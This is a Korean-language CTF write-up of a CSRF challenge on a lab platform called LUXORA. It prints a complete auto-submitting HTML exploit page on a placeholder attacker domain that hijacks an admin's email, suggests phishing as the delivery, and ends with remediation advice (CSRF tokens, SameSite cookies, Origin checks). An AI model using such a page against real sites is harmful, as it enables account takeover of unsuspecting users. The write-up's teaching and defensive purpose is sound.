+++
title = "VulnABLE CTF [LUXORA] Write-up: CSRF 🥉 Bronze"
description = "LUXORA 플랫폼의 CSRF(Cross-Site Request Forgery) 취약점을 이용한 관리자 계정 이메일 강제 변경 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CSRF", "Bronze", "Account Takeover", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CSRF 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (CSRF)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/csrf/bronze`
- **목표**: 안티 CSRF 토큰(Anti-CSRF Token)과 같은 방어 수단이 전무한 상태에서, 관리자가 악성 페이지를 방문하도록 유도하여 관리자의 이메일을 해커의 이메일로 강제로 변경하게 만드는 공격을 수행하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/csrf/bronze` 경로에 접속하여 내 계정의 이메일(Email) 변경 기능을 테스트해 봅니다.
'Update Email' 버튼을 누르면 다음과 같은 POST 요청이 날아갑니다.

**[정상 이메일 변경 요청 패킷]**
```http
POST /csrf/bronze/update-email HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session_id=user_session_cookie_xyz

email=newuser@luxora.test
```

**[해커의 사고 과정]**
1. 이메일을 변경하는 중요한 요청인데, 요청 바디(Body)에는 그저 `email` 파라미터 하나만 달랑 들어있다.
2. 폼 제출 시, 숨겨진 필드로 랜덤한 문자열(CSRF Token)을 함께 보내는 방어 로직이 없다!
3. 또한 `Cookie` 헤더에 `SameSite` 속성이 엄격하게 설정되어 있지 않다면, 외부 사이트에서 이 주소로 POST 요청을 쏠 때 브라우저가 알아서 이 쿠키를 함께 담아 보낼 것이다.
4. 해커의 웹사이트에 가짜 폼을 만들어두고, 봇(Admin)이 그 페이지에 접속하게 유도하자.

---

## 💥 2. 취약점 식별 및 악성 페이로드 작성 (Exploitation)

**CSRF (Cross-Site Request Forgery)** 공격은 내가 서버를 직접 해킹하는 것이 아니라, 이미 로그인되어 있는 "권한 있는 사용자(관리자)"가 자신도 모르게 서버에 요청을 보내게 만드는 공격입니다.

### 💡 악성 웹 페이지(Exploit HTML) 작성
해커가 운영하는 서버(`http://evil-attacker.com/exploit.html`)에 다음과 같은 코드를 작성합니다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>
    
    <!-- 희생자가 눈치채지 못하게 숨겨진 폼을 만듦 -->
    <form id="csrf_form" action="http://localhost:3000/csrf/bronze/update-email" method="POST" target="hidden_iframe">
        <input type="hidden" name="email" value="hacker@evil.com" />
    </form>
    
    <iframe name="hidden_iframe" style="display:none;"></iframe>
    
    <script>
        // 페이지가 열리자마자 폼이 자동으로 전송됨 (Auto-Submit)
        document.getElementById("csrf_form").submit();
    </script>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 결과 확인

### Step 1. 악성 링크 전송
이 HTML 페이지가 호스팅된 링크(`http://evil-attacker.com/exploit.html`)를 XSS 게시판에 올리거나, 피싱 메일을 통해 관리자(Admin Bot)가 클릭하도록 유도합니다.

### Step 2. 희생자의 브라우저 동작
1. 관리자가 링크를 클릭합니다.
2. 관리자의 브라우저가 해커의 HTML 페이지를 렌더링합니다.
3. 스크립트에 의해 `<form>` 이 자동으로 제출(Submit)됩니다.
4. 대상 주소는 `http://localhost:3000/csrf...` 이므로, 브라우저는 이 주소로 이동하면서 브라우저에 저장되어 있던 **관리자의 세션 쿠키**를 함께 실어 보냅니다. (이것이 CSRF의 핵심 원리입니다!)

### 🔍 서버의 반응
서버는 이 요청이 해커의 사이트에서 시작되었는지, 정상적인 럭소라 사이트에서 시작되었는지 구별할 방법이 없습니다. 그저 "아, 관리자의 세션 쿠키가 있으니 관리자가 이메일을 hacker@evil.com 으로 바꾸고 싶어 하는군!" 하고 처리해버립니다.

```text
[!] System: Admin email changed successfully by an external trigger.
FLAG: FLAG{CSRF_🥉_NO_TOKEN_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

세션 쿠키의 자동 전송 특성을 악용하여, 사용자 몰래 사용자의 권한을 도용하는 CSRF 공격을 훌륭하게 수행했습니다.

**🔥 획득한 플래그:**
`FLAG{CSRF_🥉_NO_TOKEN_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
브라우저는 다른 도메인으로 요청을 보낼 때도 쿠키를 기본적으로 실어 보냅니다. (과거 브라우저들의 기본 동작) 서버는 요청의 "출처(Origin)"를 검증하지 않고 쿠키의 유효성만 검증했습니다.

* **안전한 패치 가이드 (Anti-CSRF 방어 3종 세트)**

1. **Anti-CSRF Token (Synchronizer Token Pattern)**
   폼을 렌더링할 때 서버가 난수로 된 토큰을 생성하여 세션에 저장하고, 폼의 `input type="hidden"` 에도 넣습니다. 폼 제출 시 서버는 이 두 값이 일치하는지 확인합니다. 해커는 타겟 시스템의 토큰을 읽어올 수 없으므로(SOP 정책 때문에) 공격이 차단됩니다.
   ```html
   <!-- 정상적인 폼 -->
   <form action="/update-email" method="POST">
       <input type="hidden" name="csrf_token" value="abc123xyz_secure_token">
       ...
   </form>
   ```

2. **SameSite Cookie 속성 설정 (가장 쉬운 방어법)**
   쿠키를 발급할 때 `SameSite=Lax` 또는 `SameSite=Strict` 옵션을 주면, 브라우저가 외부 도메인(해커 사이트)에서 출발한 요청에는 쿠키를 실어 보내지 않습니다.
   ```http
   Set-Cookie: session_id=xyz123; HttpOnly; SameSite=Lax
   ```

3. **Referer 및 Origin 헤더 검증**
   요청이 들어올 때, `Origin` 헤더가 `https://www.luxora.test` 인지 확인하여 타 사이트에서의 POST 요청을 원천 차단합니다.